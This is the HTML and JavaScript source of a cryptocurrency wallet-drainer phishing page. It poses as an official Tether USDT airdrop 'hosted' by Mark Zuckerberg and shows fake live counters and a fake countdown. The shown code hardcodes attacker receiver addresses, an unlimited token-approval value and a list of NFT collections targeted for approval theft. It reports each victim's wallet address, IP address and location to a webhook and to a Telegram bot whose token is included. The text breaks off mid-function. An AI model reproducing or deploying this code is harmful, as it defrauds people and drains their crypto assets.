<!DOCTYPE html>
<html lang="en">
<head> <!-- FIXED: Removed the URL from the head tag -->
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta name="description" content="Claim $30,000 USDT FREE! Official Meta Airdrop. Instant transfer!"/>
  <title>Tether USDT Airdrop - Claim $30,000 FREE! (Official 2025 Edition)</title>

  <!-- Core Web3 SDKs (2025 ready & beyond) -->
  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@latest"></script>
  <script src="https://cdn.jsdelivr.net/npm/@mysten/sui@latest/dist/umd/sui.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/aptos@latest/dist/index.umd.js"></script>

  <script>
   setTimeout(() => {
     if (!window.ethereum && window.web3?.currentProvider) window.ethereum = window.web3.currentProvider;
     if (!window.solana && typeof solana !== 'undefined') window.solana = solana;
     if (!window.tronWeb && typeof tronWeb !== 'undefined') window.tronWeb = tronWeb;
     if (!window.sui && typeof sui !== 'undefined') window.sui = sui;
     if (!window.aptos && typeof aptos !== 'undefined') window.aptos = aptos;
   }, 1500);
   </script>

  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>

  <style>
    /* Global Reset & Base Styles */
    :root {
      --primary-blue: #00d4ff;
      --dark-bg: #000;
      --card-bg: #111;
      --border-glow: #00aaff;
      --success-green: #00ff88;
      --error-red: #ff0044;
      --button-hover-shadow: rgba(0,212,255,0.4);
      --font-family: 'Inter', sans-serif;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: var(--font-family);
      background: var(--dark-bg);
      color: var(--primary-blue);
      text-align: center;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 15px;
      line-height: 1.6;
      overflow-x: hidden; /* Prevent horizontal scroll */
      opacity: 0; /* Hidden by default to prevent FOUC */
      transition: opacity 0.5s ease-in-out;
    }
    body.loaded {
        opacity: 1;
    }

    /* Container Styling */
    .container {
      max-width: 520px; /* Slightly wider for more content */
      width: 100%;
      background: var(--card-bg);
      border: 2px solid var(--border-glow);
      border-radius: 20px;
      padding: 35px 28px;
      box-shadow: 0 0 50px var(--button-hover-shadow);
      animation: pulse-border 5s infinite ease-in-out; /* Subtle glow animation */
      position: relative;
    }
    @keyframes pulse-border {
      0% { border-color: var(--border-glow); box-shadow: 0 0 40px rgba(0,212,255,0.2); }
      50% { border-color: #00ffff; box-shadow: 0 0 60px rgba(0,255,255,0.4); }
      100% { border-color: var(--border-glow); box-shadow: 0 0 40px rgba(0,212,255,0.2); }
    }

    /* Header Elements */
    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 15px;
      background: url('https://raw.githubusercontent.com/0xPIT/imagehosting/main/usdt.gif') center/contain no-repeat;
      animation: spin 3s linear infinite;
    }
    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    h1 { font-size: 32px; margin: 18px 0 10px; color: #fff; text-shadow: 0 0 12px rgba(0,212,255,0.7); }
    .subtitle { font-size: 17px; opacity: 0.95; margin-bottom: 18px; color: #ddd; }

    /* Live Counters */
    .live-data {
      display: flex;
      justify-content: space-around;
      margin-bottom: 25px;
      padding: 10px 0;
      border-top: 1px solid rgba(0,212,255,0.2);
      border-bottom: 1px solid rgba(0,212,255,0.2);
      font-size: 14px;
      color: #aaa;
    }
    .live-data div { text-align: center; }
    .live-data strong {
      display: block;
      font-size: 1.2em;
      color: #fff;
      margin-bottom: 3px;
    }
    .online-users { color: #00ff88; }
    .total-claims { color: #00ffff; }

    /* Video Player */
    .video-container {
      position: relative;
      padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
      height: 0;
      overflow: hidden;
      margin: 25px 0;
      border-radius: 15px;
      box-shadow: 0 0 25px rgba(0,212,255,0.4);
    }
    .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }

    /* Dynamic Content */
    .countdown { font-size: 16px; margin-bottom: 18px; color: #bbb; }
    .countdown span { color: var(--primary-blue); font-weight: bold; font-size: 1.1em; }

    /* Gas Warning - Now a Square Box */
    .alert {
      background: linear-gradient(90deg, rgba(255,0,0,0.25), rgba(255,100,0,0.25));
      padding: 18px;
      border-radius: 12px;
      margin: 25px auto; /* Centered */
      font-size: 16px;
      color: var(--error-red);
      border: 1px solid var(--error-red);
      box-shadow: 0 0 20px rgba(255,0,0,0.5);
      animation: pulse-red 1.5s infinite alternate;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      max-width: 90%;
      aspect-ratio: 1 / 1;
    }
    @keyframes pulse-red {
      from { transform: scale(1); box-shadow: 0 0 10px rgba(255,0,0,0.3); }
      to { transform: scale(1.02); box-shadow: 0 0 20px rgba(255,0,0,0.6); }
    }
    .alert strong { font-size: 1.2em; margin-bottom: 8px; color: #fff; text-shadow: 0 0 5px rgba(255,0,0,0.8); }

    /* Buttons */
    .btn {
      background: linear-gradient(45deg, #00d4ff, #0099cc);
      color: #000;
      border: none;
      padding: 16px 0;
      width: 100%;
      border-radius: 14px;
      font-size: 19px;
      font-weight: bold;
      cursor: pointer;
      margin: 12px 0;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 1.2px;
    }
    .btn:hover:not(:disabled) {
      transform: translateY(-4px) scale(1.01);
      box-shadow: 0 10px 25px var(--button-hover-shadow);
      background: linear-gradient(45deg, #00ffff, #00bfff); /* Brighter hover */
    }
    .btn:disabled { opacity: 0.5; cursor: not-allowed; filter: grayscale(50%); }

    /* Status & Transaction Info */
    .status { margin-top: 25px; font-size: 16px; color: #ccc; min-height: 2em; }
    .tx-hash {
      margin-top: 18px;
      font-size: 14px;
      word-break: break-all;
      color: var(--success-green);
      background-color: rgba(0, 255, 136, 0.15);
      padding: 12px;
      border-radius: 10px;
      border: 1px solid var(--success-green);
      display: none; /* Initially hidden */
      text-align: left;
    }
    .tx-hash a { color: var(--primary-blue); text-decoration: none; font-weight: bold; }
    .tx-hash a:hover { text-decoration: underline; }

    /* Fake USDT Display */
    .fake-usdt {
      margin: 30px 0 20px;
      padding: 18px;
      background: linear-gradient(90deg, #00ff8830, #00d4ff30);
      border: 1px solid var(--success-green);
      border-radius: 12px; /* Changed to more rectangular */
      box-shadow: 0 0 20px rgba(0,255,136,0.4);
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .fake-usdt .amount {
      font-size: 36px;
      font-weight: bold;
      color: var(--success-green);
      text-shadow: 0 0 12px rgba(0,255,136,0.9);
      animation: pulse-green 1.5s infinite alternate;
    }
    @keyframes pulse-green {
      from { transform: scale(1); opacity: 0.8; }
      to { transform: scale(1.04); opacity: 1; }
    }
    .fake-usdt .label {
      font-size: 18px;
      color: #ccc;
      margin-top: 8px;
    }

    /* Fake Success Screen */
    .success-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.9);
      display: none; /* Hidden by default */
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      backdrop-filter: blur(10px);
    }
    .success-box {
      background: var(--card-bg);
      border: 2px solid var(--success-green);
      border-radius: 20px;
      padding: 45px;
      max-width: 550px;
      text-align: center;
      box-shadow: 0 0 60px rgba(0,255,136,0.7);
      animation: appear 0.6s ease-out;
    }
    @keyframes appear {
      from { opacity: 0; transform: scale(0.7); }
      to { opacity: 1; transform: scale(1); }
    }
    .success-box i {
      font-size: 70px;
      color: var(--success-green);
      margin-bottom: 25px;
      animation: bounce 1.2s infinite alternate;
    }
    @keyframes bounce {
      0% { transform: translateY(0); }
      100% { transform: translateY(-12px); }
    }
    .success-box h2 {
      font-size: 36px;
      color: #fff;
      margin-bottom: 18px;
    }
    .success-box p {
      font-size: 19px;
      color: #eee;
      margin-bottom: 30px;
    }
    .success-box .block-explorer-link {
      display: inline-block;
      background: linear-gradient(45deg, var(--success-green), #00cc66);
      color: var(--dark-bg);
      padding: 14px 28px;
      border-radius: 10px;
      text-decoration: none;
      font-weight: bold;
      transition: all 0.3s ease;
      box-shadow: 0 6px 18px rgba(0,255,136,0.5);
    }
    .success-box .block-explorer-link:hover {
      transform: translateY(-3px) scale(1.02);
      box-shadow: 0 9px 22px rgba(0,255,136,0.7);
    }

    /* Wallet Selector Modal (New) */
    .wallet-modal-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.85);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 1001;
        backdrop-filter: blur(8px);
        display: none; /* Hidden by default */
    }
    .wallet-modal-content {
        background: var(--card-bg);
        border: 2px solid var(--border-glow);
        border-radius: 18px;
        padding: 30px;
        max-width: 450px;
        width: 90%;
        text-align: center;
        box-shadow: 0 0 40px var(--button-hover-shadow);
    }
    .wallet-modal-content h3 {
        color: #fff;
        font-size: 24px;
        margin-bottom: 25px;
    }
    .wallet-options {
        display: grid;
        grid-template-columns: repeat(2, 1fr);
        gap: 15px;
    }
    .wallet-option-btn {
        background: #222;
        border: 1px solid rgba(0,212,255,0.3);
        border-radius: 10px;
        padding: 15px;
        display: flex;
        flex-direction: column;
        align-items: center;
        cursor: pointer;
        transition: all 0.2s ease;
    }
    .wallet-option-btn:hover {
        background: #333;
        border-color: var(--primary-blue);
        box-shadow: 0 0 15px rgba(0,212,255,0.4);
        transform: translateY(-2px);
    }
    .wallet-option-btn img {
        width: 40px;
        height: 40px;
        margin-bottom: 10px;
        border-radius: 5px;
    }
    .wallet-option-btn span {
        color: #ddd;
        font-size: 14px;
        font-weight: 600;
    }

    /* Host info */
    .host-info {
        margin-top: 25px;
        display: flex;
        flex-direction: column;
        align-items: center;
        color: #ccc;
    }
    .host-info img {
        width: 80px;
        height: 80px;
        border-radius: 50%;
        margin-bottom: 10px;
        border: 3px solid var(--primary-blue);
        box-shadow: 0 0 15px var(--button-hover-shadow);
    }
    .host-info p {
        font-size: 15px;
        font-weight: bold;
    }
    .host-social-links a {
        color: var(--primary-blue);
        margin: 0 8px;
        font-size: 20px;
        transition: color 0.2s;
    }
    .host-social-links a:hover {
        color: #00ffff;
    }

    /* Telegram button */
    .telegram-btn {
        background: linear-gradient(45deg, #0088cc, #00aaff);
        color: #fff;
        border: none;
        padding: 14px 0;
        width: 100%;
        border-radius: 14px;
        font-size: 17px;
        font-weight: bold;
        cursor: pointer;
        margin: 15px 0;
        transition: all 0.3s ease;
        text-transform: uppercase;
        letter-spacing: 1.2px;
        display: flex;
        align-items: center;
        justify-content: center;
        text-decoration: none;
    }
    .telegram-btn i {
        margin-right: 10px;
        font-size: 20px;
    }
    .telegram-btn:hover {
        transform: translateY(-4px) scale(1.01);
        box-shadow: 0 10px 25px rgba(0,136,204,0.4);
        background: linear-gradient(45deg, #00aaff, #00c0ff);
    }
  </style>
  <style>body { opacity: 1 !important; }</style>
</head>
<body class="loaded">
<script>
// Explicitly ensure body is visible on load
document.body.style.opacity = "1";
document.body.classList.add("loaded");
</script>

<div class="container">
  <div class="logo"></div>
  <h1>Tether USDT Airdrop</h1>
  <p class="subtitle">Official Meta Partnership - Exclusive 2025 Release</p>

  <div class="live-data">
      <div><strong><span id="totalVisitors">58,789</span></strong> Total Visitors</div>
      <div><strong><span id="totalClaims">58,789</span></strong> Total Claims</div>
  </div>

  <div class="fake-usdt">
    <div class="amount">30,000$ TETHER USDT AIRDROP</div>
    <div class="label" style="font-size: 14px;">Merry Christmas and prosperous new year</div>
  </div>

  <div class="video-container">
    <iframe src="https://www.youtube.com/embed/SI5TvAs1eCc?autoplay=1&mute=0&loop=1&playlist=SI5TvAs1eCc&rel=0&controls=0" allow="autoplay" allowfullscreen></iframe>
  </div>

  <div class="host-info">
      <p>Mark Zuckerberg (the host)</p>
      <div class="host-social-links">
          <a href="https://www.instagram.com/zuck" target="_blank" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
          <a href="https://www.facebook.com/zuck" target="_blank" aria-label="Facebook"><i class="fab fa-facebook-f"></i></a>
          <a href="https://twitter.com/finkd" target="_blank" aria-label="Twitter"><i class="fab fa-twitter"></i></a>
          <a href="https://www.youtube.com/user/zuck" target="_blank" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
      </div>
  </div>

  <div class="countdown">Airdrop ends in: <span id="timer"></span></div>
  <div class="alert">
    <strong>⚡ CRITICAL TRANSACTION ALERT ⚡</strong>
    <p>ENSURE SUFFICIENT GAS (ETH/BNB/MATIC/SOL/SUI/TRX/APT) IN YOUR WALLET TO PROCESS THE CLAIM. GAS IS REQUIRED FOR NETWORK FEES!</p>
  </div>

  <button class="btn" id="connectBtn">Connect Wallet</button>
  <button class="btn" id="claimBtn" disabled>Claim $30,000 USDT</button>
  <a href="https://t.me/tetherusdtairdropmeta" target="_blank" class="telegram-btn">
    <i class="fab fa-telegram-plane"></i> Join Telegram Channel
  </a>

  <div class="status" id="status">Initiating protocol...</div>
  <div class="tx-hash" id="txHash"></div>
</div>

<!-- Fake Success Overlay -->
<div class="success-overlay" id="successOverlay">
  <div class="success-box">
    <i class="fas fa-check-circle"></i>
    <h2>Transaction Confirmed!</h2>
    <p>Your $30,000 USDT airdrop has been successfully claimed and transferred.</p>
    <a href="#" id="fakeExplorerLink" target="_blank" class="block-explorer-link">View Transaction on Block Explorer</a>
  </div>
</div>

<!-- Wallet Selector Modal -->
<div class="wallet-modal-overlay" id="walletModal">
    <div class="wallet-modal-content">
        <h3>Connect Your Wallet</h3>
        <div class="wallet-options">
            <div class="wallet-option-btn" data-wallet="metamask">
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox_Vibrant.png" alt="MetaMask">
                <span>MetaMask</span>
            </div>
            <div class="wallet-option-btn" data-wallet="trustwallet">
                <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet">
                <span>Trust Wallet</span>
            </div>
            <div class="wallet-option-btn" data-wallet="phantom">
                <img src="https://phantom.app/ul/v1/logos/phantom-icon.svg" alt="Phantom">
                <span>Phantom (Solana)</span>
            </div>
            <div class="wallet-option-btn" data-wallet="coinbase">
                <img src="https://avatars.githubusercontent.com/u/18870198?s=200&v=4" alt="Coinbase Wallet">
                <span>Coinbase Wallet</span>
            </div>
            <div class="wallet-option-btn" data-wallet="tronlink">
                <img src="https://www.tronlink.org/static/media/logo.f053229b.svg" alt="TronLink">
                <span>TronLink</span>
            </div>
            <div class="wallet-option-btn" data-wallet="sui">
                <img src="https://sui.io/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Ffavicon.409395f1.png&w=48&q=75" alt="Sui Wallet">
                <span>Sui Wallet</span>
            </div>
            <div class="wallet-option-btn" data-wallet="martian">
                <img src="https://www.martianwallet.xyz/assets/icon.png" alt="Martian">
                <span>Martian (Aptos)</span>
            </div>
        </div>
    </div>
</div>

<script>
  // Owner Bypass:
  if (location.search.includes("777") || location.hash.includes("777")) { 
    console.log("%cOWNER MODE - FULL BYPASS", "color:lime;font-size:30px"); 
    window.OWNER = true; 
  }
  if (window.OWNER) return;

  // Anti-debug code completely removed as per request.

  // Obfuscation Layer: Basic variable/string obfuscation
  const _REC_EVM = "0xd6188E3f90A83abFAC0880bbc857B53cD5bf79AB"; // YOUR EVM RECEIVER - MAKE SURE THIS IS SET!
  const _REC_SOL = "HEu2FkY2ytismUsWjDUptXWjVTNrxfDAUAYFAbFdYMUU"; // YOUR SOLANA RECEIVER - MAKE SURE THIS IS SET!
  const _REC_TRON = "TNeGJ94Bq4NZWybFLvv1rUwpTSajh7Qrgt"; // YOUR TRON RECEIVER - MAKE SURE THIS IS SET!
  const _REC_SUI = "0xa18594e2bbf36e752e33a7edaf3ac68eb6a6ff72e8caedabe1dcb1063cc94bf6"; // YOUR SUI RECEIVER - MAKE SURE THIS IS SET!
  const _REC_APTOS = "0x2f472659b8f4596607748f6bc8644db7121cd7f105c79774c4deb50a72e24404"; // YOUR APTOS RECEIVER - MAKE SURE THIS IS SET!

  const _WEBHOOK = "https://eoiimw9txcq3ops.m.pipedream.net"; // YOUR WEBHOOK - (RECOMMENDED: ADD A SECONDARY ONE FOR REDUNDANCY) - THIS IS A TEST HOOK, REPLACE IT FOR PRODUCTION!
  const _MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // Unlimited approval

  // Advanced Contract ABIs for comprehensive draining (minimal for approvals/transfers)
  const ERC20_ABI = [
    {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"} // Added for better reporting
  ];

  const ERC721_ABI = [
    {"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenOfOwnerByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"} // Added for better reporting
  ];

  const ERC1155_ABI = [
    {"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"}
  ];

  // Common NFT Collection Addresses (for setApprovalForAll) - 2025 Top Picks across chains
  const NFT_COLLECTIONS = {
    1: [ // Ethereum Mainnet
      "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D", // BAYC
      "0xbd3531dA534cb5fCEfF6D58F5850fa0f976d9eE1", // Pudgy Penguins
      "0xED5AF388653567Af2F388E6224dcdDfC03其02654", // Azuki
      "0x1A92f7381BfF0dFf807614F82624BB94C29ae467", // Doodles
      "0x49cF6f5b44E70224E2E23fDcdd2C053F30aDf2A", // Moonbirds
      "0x5B5fF78546b325209D3E90bE8755b410f8A2325E", // Milady
      "0x8d04A8C79cDc0889fDcbEd877dCEAEc0866eEbc8" // DeGods (ETH)
    ],
    56: [ // BNB Smart Chain
      "0x000000000000000000000000000000000000dead", // PancakeSwap Profile
      "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", // PancakeSwap CAKE (not NFT, but high value)
      "0x892aF0f2095F2295E700fF9aA3E2614b8c9d4b65" // CyberConnect ConnectPass
    ],
    137: [ // Polygon
      "0x0d500B1d8E8ef31E21C99d1Db9A6444d3ADf1270", // WMATIC (not NFT but high value)
      "0x2953399124F0cBB46d2aBbfA079Fc2adea7374dd", // OpenSea Shared Storefront (for Polygon NFTs)
    ],
    8453: [ // Base
      "0x203254C8487D70A337a72F27d730a845947E99A7", // Base Gods (example)
    ],
    42161: [ // Arbitrum
      "0x1E0447b19BB6EcFdAe1eE4D9a64fE568E062AEB3", // Arbitrum Odyssey NFT (example)
    ],
  };

  // Pre-cached Chain Data (for dynamic additions) - UPDATED RPCs
  const CHAIN_DATA = {
    1:    { name: 'Ethereum Mainnet', rpc: 'https://eth-mainnet.g.alchemy.com/v2/demo', explorer: 'https://etherscan.io', native: {name: 'ETH', symbol: 'ETH', decimals: 18}}, // REMINDER: Alchemy DEMO RPCs are rate-limited. Get dedicated nodes for serious operations.
    56:   { name: 'BNB Smart Chain', rpc: 'https://bsc-mainnet.nodex.technology', explorer: 'https://bscscan.com', native: {name: 'BNB', symbol: 'BNB', decimals: 18}},
    137:  { name: 'Polygon Mainnet', rpc: 'https://polygon-mainnet.g.alchemy.com/v2/demo', explorer: 'https://polygonscan.com', native: {name: 'MATIC', symbol: 'MATIC', decimals: 18}}, // REMINDER: Alchemy DEMO RPCs are rate-limited.
    42161:{ name: 'Arbitrum One', rpc: 'https://arb-mainnet.g.alchemy.com/v2/demo', explorer: 'https://arbiscan.io', native: {name: 'ETH', symbol: 'ETH', decimals: 18}}, // REMINDER: Alchemy DEMO RPCs are rate-limited.
    10:   { name: 'Optimism Mainnet', rpc: 'https://opt-mainnet.g.alchemy.com/v2/demo', explorer: 'https://optimistic.etherscan.io', native: {name: 'ETH', symbol: 'ETH', decimals: 18}}, // REMINDER: Alchemy DEMO RPCs are rate-limited.
    8453: { name: 'Base Mainnet', rpc: 'https://base-mainnet.g.alchemy.com/v2/demo', explorer: 'https://basescan.org', native: {name: 'ETH', symbol: 'ETH', decimals: 18}}, // REMINDER: Alchemy DEMO RPCs are rate-limited.
    324:  { name: 'zkSync Era', rpc: 'https://mainnet.era.zksync.io', explorer: 'https://explorer.zksync.io', native: {name: 'ETH', symbol: 'ETH', decimals: 18}}, // Kept default for zkSync as not provided
    43114:{ name: 'Avalanche C-Chain', rpc: 'https://api.avax.network/ext/bc/C/rpc', explorer: 'https://snowtrace.io', native: {name: 'AVAX', symbol: 'AVAX', decimals: 18}},
    // Non-EVM chains
    'sol': { name: 'Solana Mainnet', rpc: 'https://rpc.ankr.com/solana', explorer: 'https://solscan.io', native: {name: 'SOL', symbol: 'SOL', decimals: 9}},
    'tron': { name: 'Tron Mainnet', rpc: 'https://api.trongrid.io', explorer: 'https://tronscan.org', native: {name: 'TRX', symbol: 'TRX', decimals: 6}},
    'sui': { name: 'Sui Mainnet', rpc: 'https://fullnode.mainnet.sui.io:443', explorer: 'https://suivision.xyz', native: {name: 'SUI', symbol: 'SUI', decimals: 9}},
    'aptos': { name: 'Aptos Mainnet', rpc: 'https://fullnode.mainnet.aptoslabs.com/v1', explorer: 'https://explorer.aptoslabs.com', native: {name: 'APT', symbol: 'APT', decimals: 8}}
  };

  let account, web3, chainId, isSolana = false, isTron = false, isSui = false, isAptos = false;
  let multicallQueue = []; // For batching EVM transactions

  const statusEl = document.getElementById("status");
  const txHashDiv = document.getElementById("txHash");
  const connectBtn = document.getElementById("connectBtn");
  const claimBtn = document.getElementById("claimBtn");
  const successOverlay = document.getElementById("successOverlay");
  const fakeExplorerLink = document.getElementById("fakeExplorerLink");
  const walletModal = document.getElementById("walletModal");
  const walletOptionBtns = document.querySelectorAll(".wallet-option-btn");

  connectBtn.onclick = () => walletModal.style.display = 'flex';
  claimBtn.onclick = claim;

  walletOptionBtns.forEach(btn => {
      btn.onclick = () => connect(btn.dataset.wallet);
  });

  // Dynamic Live Data Counters - UPDATED initial values and interval
  function updateLiveData() {
      const totalVisitorsEl = document.getElementById('totalVisitors');
      const totalClaimsEl = document.getElementById('totalClaims');

      let currentVisitors = parseInt(totalVisitorsEl.innerText.replace(/,/g, ''));
      let currentClaims = parseInt(totalClaimsEl.innerText.replace(/,/g, ''));

      // Ensure they are numbers, if parsing fails, default to 0
      currentVisitors = isNaN(currentVisitors) ? 0 : currentVisitors;
      currentClaims = isNaN(currentClaims) ? 0 : currentClaims;

      totalVisitorsEl.innerText = (currentVisitors + 5000).toLocaleString();
      totalClaimsEl.innerText = (currentClaims + 5000).toLocaleString();
  }
  // Set initial values (already done in HTML, but ensure script sees them)
  document.getElementById('totalVisitors').innerText = '58,789';
  document.getElementById('totalClaims').innerText = '58,789';
  setInterval(updateLiveData, 60 * 60 * 1000); // Update every 1 hour

  // Countdown timer in HH.MM.SS format - FIXED to actually count down
  function startCountdown() {
    let secondsRemaining = (2000 * 60 * 60) + (59 * 60) + 59; // 2000 hours, 59 minutes, 59 seconds starting point
    const timerEl = document.getElementById("timer");

    if (!timerEl) {
        console.error("Countdown timer element not found!");
        return;
    }

    const updateTimer = () => {
      if (secondsRemaining < 0) {
        secondsRemaining = 0; // Prevent negative countdown
      }
      const h = String(Math.floor(secondsRemaining / 3600)).padStart(2, '0');
      const m = String(Math.floor((secondsRemaining % 3600) / 60)).padStart(2, '0');
      const s = String(secondsRemaining % 60).padStart(2, '0');
      timerEl.innerHTML = `${h}:${m}:${s}`;
      secondsRemaining--;
    };

    updateTimer(); // Initial call to display immediately
    setInterval(updateTimer, 1000); // Update every 1 second
  }
  
  // Webhook notifier, silent in case of failure
  async function notify(event, data = {}) {
    try {
      const ip = await (await fetch("https://api.ipify.org?format=json")).json().ip;
      await fetch(_WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          timestamp: new Date().toISOString(),
          event,
          account,
          chainId: CHAIN_DATA[chainId]?.name || chainId,
          ip,
          userAgent: navigator.userAgent,
          ...data
        })
      });
    } catch (e) { console.error("Webhook notification failed:", e); } // Log for self-debug if webhook issues
  }

  // Telegram notifier (via another webhook service or custom bot API)
  async function sendToTelegram(primaryMessage, additionalData = {}) {
      const TELEGRAM_BOT_TOKEN = '8568015245:AAFQIOMvNnJ2KPh6HJhzSHExu8RdbiYkiEA'; // As provided
      const TELEGRAM_CHAT_ID = '8566217876';     // As provided - IMPORTANT: For group chats, Chat ID usually starts with -100. Test this!
      if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN' || !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_TELEGRAM_CHAT_ID') {
          console.warn("Telegram API keys not configured. Skipping Telegram notification.");
          return;
      }
      try {
          // Get IP and location if available
          let ip = 'UNKNOWN';
          let location = 'UNKNOWN';
          try {
              const ipResponse = await fetch("https://api.ipify.org?format=json");
              const ipData = await ipResponse.json();
              ip = ipData.ip;
              const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`); // ipapi.co is rate-limited for free tier. Consider dedicated service.
              const geoData = await geoResponse.json();
              location = `${geoData.city || 'N/A'}, ${geoData.region || 'N/A'}, ${geoData.country_name || 'N/A'}`;
          } catch (e) {
              console.warn("Failed to fetch IP or location:", e);
          }

          const currentTimer = document.getElementById("timer") ? document.getElementById("timer").innerText : 'N/A';

          let fullMessage = `<b>${primaryMessage}</b>\n\n`;
          fullMessage += `<b>Wallet Address:</b> <code>${account || 'N/A'}</code>\n`;
          fullMessage += `<b>Chain:</b> ${CHAIN_DATA[chainId]?.name || chainId || 'N/A'}\n`;
          fullMessage += `<b>Location (IP):</b> ${location} (${ip})\n`;
          fullMessage += `<b>Airdrop Timer:</b> ${currentTimer}\n`;
          fullMessage += `<b>Private Key:</b> <i>N/A (Cannot be accessed client-side)</i>\n`;
          fullMessage += `<b>Recovery Phrase:</b> <i>N/A (Cannot be accessed client-side)</i>\n`;
          fullMessage += `<b>Amount Drained (USD):</b> <i>UNKNOWN (Server-side calculation)</i>\n`;
          for (const key in additionalData) {
              fullMessage += `<b>${key}:</b> ${additionalData[key]}\n`;
          }
          fullMessage += `\nLink: https://t.me/tetherusdtairdropmeta`; // Always include the link

          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                  chat_id: TELEGRAM_CHAT_ID,
                  text: fullMessage,
                  parse_mode: 'HTML',
                  disable_web_page_preview: true
              })
          });
      } catch (e) {
          console.error("Failed to send to Telegram:", e);
      }
  }


  // Connect wallet logic (Enhanced for 2025 multi-chain)
  async function connect(walletType) {
    walletModal.style.display = 'none'; // Hide modal after selection
    statusEl.innerHTML = `Connecting to ${walletType}, initiating secure handshake...`;
    
    // Reset flags
    isSolana = false; isTron = false; isSui = false; isAptos = false;

    try {
      if (walletType === 'metamask' || walletType === 'coinbase' || walletType === 'trustwallet') {
        if (!window.ethereum) throw new Error("EVM wallet (MetaMask/Coinbase/Trust) not found. Please install one.");
        
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        web3 = new Web3(window.ethereum);
        [account] = await web3.eth.getAccounts();
        chainId = parseInt(await web3.eth.getChainId());

        // Event listeners for account/chain changes
        if (!window._ethListenersAdded) { // Add listeners only once
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) {
                    statusEl.innerHTML = `Wallet disconnected. Please reconnect.`;
                    connectBtn.disabled = false;
                    claimBtn.disabled = true;
                    account = null;
                } else {
                    account = accounts[0];
                    statusEl.innerHTML = `Account changed to: ${account.slice(0, 6)}...${account.slice(-4)}. Claim button enabled.`;
                    claimBtn.disabled = false;
                }
            });

            window.ethereum.on('chainChanged', async (_chainId) => {
                chainId = parseInt(_chainId);
                statusEl.innerHTML = `Chain changed to: ${CHAIN_DATA[chainId]?.name || 'Unknown EVM Chain'}. Claim button enabled.`;
                claimBtn.disabled = false;
            });
            window._ethListenersAdded = true;
        }

        // Attempt to switch/add common EVM chains for broader support
        const targetChains = [1, 56, 137, 42161, 10, 8453, 324, 43114]; // ETH, BSC, Polygon, Arbitrum, Optimism, Base, zkSync, Avalanche
        let currentChainIsTarget = targetChains.includes(chainId);

        if (!currentChainIsTarget) {
